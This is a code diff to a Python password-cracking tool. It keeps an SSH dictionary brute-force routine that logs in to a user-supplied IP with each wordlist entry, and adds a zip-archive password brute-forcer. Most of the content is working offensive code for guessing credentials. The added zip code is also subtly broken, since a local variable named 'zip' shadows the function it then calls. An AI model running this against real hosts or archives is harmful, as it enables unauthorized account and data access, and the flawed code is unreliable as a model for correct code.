@@ -18,8 +18,9 @@ def startmenu():
     print ("1. Offensive: Dictionary Iterator")
     print ("2. Defensive: Password Search")
     print ("3. Offensive: Brute Force Attack")
-    print ("4. Exit")
-    selection = input("Enter Your Numbered Choice [1-4]: " )
+    print ("4. Offensive: Brute Force Zip Attack")
+    print ("5. Exit")
+    selection = input("Enter Your Numbered Choice [1-5]: " )
     if selection == '1':
         offense()
     elif selection == '2':
@@ -27,12 +28,15 @@ def startmenu():
     elif selection == '3':
         crowbar()
     elif selection == '4':
+        unzipper()
+    elif selection == '5':
         print("See you, Space Cowboy")
         time.sleep(1.6)
         sys.exit()
     else:
         print("That's definitely not one of the numbers here. Want to try again?")
     return selection
+
 
 ##############################################################################
 # Offensive Function
@@ -53,6 +57,7 @@ def offense():
     time.sleep(1.6)
     print(userLine)
 
+
 ##############################################################################
 # Defensive Function
 ##############################################################################
@@ -61,26 +66,27 @@ def defense():
     wordPath = input("Please Enter a Filepath to a Word List: ")
     file = open(wordPath, encoding = "ISO-8859-1")
     userLine = file.readline()
-    flag=0  # sets starting point for the list
-    index=0
+    flag = 0  # sets starting point for the list
+    index = 0
     for line in file:
-        index+=1
+        index += 1
         if string in line: # if the password matches the current line, break loop
-            flag=1
+            flag = 1
             break
 
-    if flag==1: # if the password was matched above, print confirmation and line number
+    if flag == 1: # if the password was matched above, print confirmation and line number
         print("Gotcha! Password Found!","Line", index)
     file.close()
     time.sleep(1.6)
+
 
 ##############################################################################
 # Connection Function
 ##############################################################################
 def connect(host,user,line):
     try:
-        ssh=pxssh.pxssh()
-        ssh.force_password=True
+        ssh = pxssh.pxssh()
+        ssh.force_password = True
         ssh.login(host,user,line)
         print("Password Verified.")
         sys.exit(0)
@@ -92,21 +98,57 @@ def connect(host,user,line):
         print("Stopped by user.")
         sys.exit(0)
 
+
 ##############################################################################
 # Brute Force Function
 ##############################################################################
 def crowbar():
-    s=pxssh.pxssh()
-    address=input("Enter an IP Address: ")
-    username=input("Enter a Username: ")
-    path=input("Enter Path To Wordlist/Dictionary: ")
-    file=open(path, "r", encoding="ISO-8859-1")
+    s = pxssh.pxssh()
+    address = input("Enter an IP Address: ")
+    username = input("Enter a Username: ")
+    path = input("Enter Path To Wordlist/Dictionary: ")
+    file = open(path, "r", encoding="ISO-8859-1")
     for p in file.readlines():
-        username=username.strip("\n")
-        password=p.strip("\n")
+        username = username.strip("\n")
+        password = p.strip("\n")
         print(str(username) + ":" + str(password))
         connect(address,str(username),str(password))
     file.close()
+
+
+##############################################################################
+# Zip File Function
+##############################################################################
+def zip (wordDatabase, path, obj):
+    idx = 0
+    print("***....Starting Brute-Force Protocol....***")
+    with open(wordDatabase, 'rb') as file:
+        for line in file:
+            for word in line.split():
+                try:
+                    idx += 1
+                    obj.extractall(pwd=word)
+                    print("Password Found!")
+                    time.sleep(1.6)
+                    print(word.decode())
+                    return True
+                except:
+                    continue
+    return False
+
+
+##############################################################################
+# Unip File Function
+##############################################################################
+def unzipper():
+    zip = input("Enter Path To .zip File:")
+    wordDatabase = input("Enter Path To Wordlist/Dictionary:")
+    obj = zipfile.ZipFile(zip)
+    cnt = len(list(open(wordDatabase, "r", encoding="ISO-8859-1")))
+    print("Beginning password search. ", cnt, " entries left to test...")
+    if zip (wordDatabase, zip, obj) == False:
+        print("Password not found.")
+
 
 ##############################################################################
 # Main
